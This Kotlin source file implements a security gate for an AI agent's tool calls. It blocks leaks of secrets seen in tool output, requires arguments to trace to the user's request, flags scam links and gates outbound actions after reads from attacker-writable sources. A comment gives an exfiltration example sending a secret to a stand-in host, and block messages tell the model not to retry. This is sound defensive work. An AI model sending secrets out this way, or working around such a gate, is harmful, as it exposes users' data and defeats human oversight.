package com.agent.jarvis.gate

import org.json.JSONObject

/**
 * The enforcement runtime (port of gatellml lang/runtime.py).
 *
 * One Episode per user request. Secrets observed in tool results accumulate
 * over the episode and may never leave via egress tools.
 */
class Gate(private val manifest: Manifest) {

    class Episode(userRequest: String) {
        val requestNorm: String = normRequest(userRequest)
        val secrets = mutableListOf<String>()
        val observations = ObservationLog()
        /** Targets the operator explicitly confirmed this episode (the
         * resolve/confirm channel — gatellml SPEC §2 R4). */
        private val confirmed = mutableSetOf<String>()

        init {
            observations.record(
                Fact(
                    tool = "<user>",
                    source = Fact.Source.USER_REQUEST,
                    confidence = Fact.Confidence.HIGH,
                    summary = userRequest.take(80),
                )
            )
        }

        /** The effective trusted text: the request plus user-confirmed targets. */
        val effectiveRequestNorm: String
            get() = if (confirmed.isEmpty()) requestNorm
            else requestNorm + " " + confirmed.joinToString(" ")

        /** True when the operator confirmed exactly this target this episode. */
        fun isConfirmed(target: String): Boolean = norm(target) in confirmed

        fun confirm(target: String) {
            val n = norm(target)
            if (n.isNotEmpty()) confirmed += n
        }

        /** Call after each tool result: collect secret-shaped material. */
        fun observeSecrets(toolResult: String) {
            secrets += findSecrets(toolResult)
        }

        /** Record that a tool produced an observation with a known source. */
        fun observeTool(tool: String, resultSummary: String = "") {
            val source = Fact.sourceOf(tool) ?: return
            observations.record(tool, source, resultSummary)
        }

        /** Record that the operator confirmed an action via the gate card. */
        fun observeOperatorConfirmation(tool: String) {
            observations.record(
                Fact(
                    tool = tool,
                    source = Fact.Source.OPERATOR_CONFIRMATION,
                    confidence = Fact.Confidence.HIGH,
                    summary = "operator confirmed $tool",
                )
            )
        }
    }

    data class Violation(val rule: String, val arg: String?, val hint: String)

    data class Verdict(
        val allowed: Boolean,
        val violations: List<Violation> = emptyList(),
        val riskScore: RiskScorer.Score? = null,
        val autoApproved: Boolean = false,
    ) {
        val rule: String? get() = violations.firstOrNull()?.rule
        val confirmable: Boolean
            get() = violations.isNotEmpty() && violations.all {
                it.rule in CONFIRMABLE_RULES
            }

        companion object {
            private val CONFIRMABLE_RULES = setOf(
                "recipient_traceable", "any_arg_traceable", "atom_in_request",
                "domain_in_request", "origin_subset", "low_confidence_egress",
                "scam_followup",
            )

            /** Confirmable, but only by a person reading why: never auto-approved,
             * whatever the risk score says. */
            val NEVER_AUTO = setOf("scam_followup")

            /**
             * Risk score at or below this threshold auto-approves confirmable
             * blocks. Covers READ (0) and RESOLVE (10) with small obs gap, never
             * EGRESS (40+) or MUTATE+untraced (30+).
             */
            const val AUTO_APPROVE_THRESHOLD = 15
        }
    }

    /**
     * Did the user actually say this, or does it merely appear inside what they
     * said?
     *
     * Whole words, in order. Punctuation is trimmed from both sides before
     * comparing, so a request ending "...open news.ycombinator.com." still
     * matches the domain argument.
     */
    internal fun saidByUser(value: String, requestNorm: String): Boolean =
        tracesToRequest(value, requestNorm)

    private fun mintOrigin(text: String, ep: Episode, function: String, arg: String): OriginSet {
        val t = text.trim()
        val req = ep.effectiveRequestNorm
        val named = if (isIdArg(arg) && idNeedsNaming(t)) {
            // an id must be named AS an id; an operator-confirmed one is named by the confirmation
            ep.isConfirmed(t) || numericNamed(t, function, req)
        } else {
            // free text: a whole-token match, long enough to mean something ("a" is a
            // token of every request), or a plain number like amount=50 in "pay 50"
            val digits = t.isNotEmpty() && t.all { it in '0'..'9' }
            val person = RECIPIENT_ARG_RE.containsMatchIn(arg)
            // amount=50 traces on "pay 50"; user="2" never traces on "user guide 2"
            ((t.length >= 3 && saidByUser(text, req)) || (digits && !person && saidByUser(t, req))) &&
                !(digits && person && t.length < 4)
        }
        return if (named) OriginSet(setOf(UserOrigin)) else OriginSet(setOf(ToolOrigin()))
    }

    private fun bindArgs(args: JSONObject, ep: Episode, function: String, optional: Set<String>): Map<String, TrackedArg> {
        val out = mutableMapOf<String, TrackedArg>()
        for (key in args.keys()) {
            val v = args.opt(key) ?: continue
            // JSON null is absent. A stringly null (cc="None") is absent only for an
            // argument the tool marks optional: on a required one "None" is a value.
            if (v == JSONObject.NULL) continue
            var s = v.toString()
            if (key in optional && s.trim().lowercase() in setOf("", "none", "null")) continue
            if (v is org.json.JSONArray && v.length() == 0) continue       // an empty list vouches for nothing
            if (v is Number && v !is Int && v !is Long) {                       // 2200.0 is 2200
                val d = v.toDouble()
                if (!d.isInfinite() && !d.isNaN() && d == Math.floor(d)) s = d.toLong().toString()
            }
            if (v is Boolean && isIdArg(key)) s = ""
            // the argument CONTAINS a secret
            val tainted = ep.secrets.any { secret -> secret.isNotEmpty() && leaks(secret, s) }
            out[key] = TrackedArg(s, OriginSet(mintOrigin(s, ep, function, key).items, tainted))
        }
        return out
    }

    fun enforceCall(ep: Episode, function: String, args: JSONObject): Verdict {
        val spec = manifest.tool(function) ?: return Verdict(
            false, listOf(Violation("undeclared_tool", null, "tool '$function' is not in the manifest"))
        )

        val bindings = bindArgs(args, ep, function, spec.optionalArgs)
        val violations = mutableListOf<Violation>()

        // Taint: secrets observed this episode may never leave. Every tool, not only
        // declared egress — open_url("evil.ru/?d=<secret>") on a "read" is a GET to
        // a server the attacker chose.
        if (ep.secrets.isNotEmpty()) {
            val blob = args.keys().asSequence().joinToString(" ") { args.opt(it)?.toString() ?: "" }
            if (ep.secrets.any { leaks(it, blob) }) {
                violations += Violation("taint_egress", null,
                    "outbound arguments contain secret-shaped strings observed in tool output")
            }
        }

        // Low-confidence egress: if anything the agent gathered came from an
        // attacker-writable source (screen, SMS, clipboard, web, another app),
        // egress requires operator confirmation. A system API read alongside it
        // does not clear this; only an operator confirmation newer than the
        // LOW observation does.
        // A search query is exempt. Sending, posting and opening a link still ask.
        if (Effect.EGRESS in spec.effects && function !in LOW_EGRESS_FREE &&
            ep.observations.hasUnconfirmedLowToolObservation()) {
            violations += Violation("low_confidence_egress", null,
                "outbound action follows low-confidence reads (screen, messages, web)")
        }

        // Scam follow-up: a number, link, email or cashtag that arrived in a message the
        // scam detector flagged. Outbound and app-driving tools only; a search stays free.
        if ((Effect.EGRESS in spec.effects || Effect.MUTATE in spec.effects) && function !in SCAM_FREE) {
            for ((k, b) in bindings) {
                if (ep.isConfirmed(b.value)) continue
                val (flag, target) = ScamWatch.match(b.value) ?: continue
                violations += Violation("scam_followup", k,
                    "$target came from a message that looks like a scam (${flag.reasons})")
                break
            }
        }

        // Egress completeness: an argument the manifest never declared is not a free channel.
        val requires = spec.requires.toMutableList()
        if (Effect.EGRESS in spec.effects) {
            // Only a contract that TRACES covers an argument.
            fun declared(arg: String, vararg kinds: kotlin.reflect.KClass<out Contract>) = requires.any { c ->
                kinds.any { it.isInstance(c) } && (c.arg == arg || (c is AnyArgTraceable && arg in c.args))
            }
            for (k in bindings.keys) {
                if (RECIPIENT_ARG_RE.containsMatchIn(k)) {
                    // A domain check covers a destination that IS a host (open_url(url=...)).
                    // It does not cover one that holds no host at all: cc=["mallory"].
                    if (declared(k, DomainInRequest::class) && DOMAIN_RE.containsMatchIn(bindings.getValue(k).value)) continue
                    if (!declared(k, RecipientTraceable::class, TargetTraceable::class, AnyArgTraceable::class))
                        requires += RecipientTraceable(k)
                } else {
                    if (!declared(k, AtomInRequest::class, RecipientTraceable::class, TargetTraceable::class))
                        requires += AtomInRequest(k)
                    if (!declared(k, DomainInRequest::class, RecipientTraceable::class, TargetTraceable::class))
                        requires += DomainInRequest(k, urlishOnly = true)
                }
            }
        }

        for (c in requires) {
            val why = c.check(bindings, ep.effectiveRequestNorm)
            if (why != null) violations += Violation(c.name, c.arg, why)
        }

        val risk = RiskScorer.score(spec, ep.observations, ep.secrets, args, ep.effectiveRequestNorm)
        if (violations.isEmpty()) return Verdict(true, riskScore = risk)

        val candidateVerdict = Verdict(false, violations, riskScore = risk)
        if (candidateVerdict.confirmable && risk.total <= Verdict.AUTO_APPROVE_THRESHOLD &&
            violations.none { it.rule in Verdict.NEVER_AUTO }) {
            return Verdict(true, violations, riskScore = risk, autoApproved = true)
        }
        return candidateVerdict
    }

    companion object {
        /** Tools that may carry a flagged target without a confirm (read-only lookups);
         * web_browse is not here. */
        private val SCAM_FREE = setOf("web_search", "shop_search")
        private val LOW_EGRESS_FREE = setOf("web_search", "shop_search", "web_browse")

        fun renderBlock(verdict: Verdict): String {
            if (verdict.rule == "scam_followup") {
                return "BLOCKED by security policy (scam_followup). " +
                    verdict.violations.first { it.rule == "scam_followup" }.hint + ". " +
                    "Tell the user this plainly, in one sentence, before anything else. Do not retry. " +
                    "Only continue if the user confirms they know and trust this sender."
            }
            val detail = verdict.violations.take(2).joinToString("; ") { it.hint }
            return "BLOCKED by security policy (${verdict.rule}). This action was not explicitly " +
                "requested by the user (targets must be named in the user's original request). " +
                "Do not retry this exact action; continue with the rest of the task or ask the " +
                "user for confirmation." + (if (detail.isNotEmpty()) " Detail: $detail" else "")
        }
    }
}
